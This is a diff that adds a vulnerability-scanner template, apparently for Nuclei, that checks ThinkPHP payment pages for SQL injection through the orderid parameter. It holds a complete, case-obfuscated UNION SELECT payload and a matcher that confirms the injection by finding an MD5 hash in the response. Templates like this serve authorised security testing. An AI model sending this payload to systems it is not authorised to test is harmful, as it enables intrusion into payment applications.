@@ -1,0 +1,29 @@
+id: poc-local-thinkphp-union-pay-orderid-sqli
+
+info:
+  name: poc-local-thinkphp-union-pay-orderid-sqli
+  author: capiton
+  severity: high
+  description: ""
+  reference: 
+    - https://github.com/bewhale/thinkphp_gui_tools
+  tags: thinkphp
+
+variables:
+  randInt: "{{rand_int(10000,99999)}}"
+  md5_randInt: "{{md5(randInt)}}"
+
+requests:
+  - raw:
+      - |-
+        GET /index.php?s=/home/pay/index/orderid/1%27)UnIoN/**/All/**/SeLeCT/**/Md5({{randInt}})--+ HTTP/1.1
+        Host: {{Hostname}}
+
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        condition: and   
+        words:  
+          - "{{md5_randInt}}"
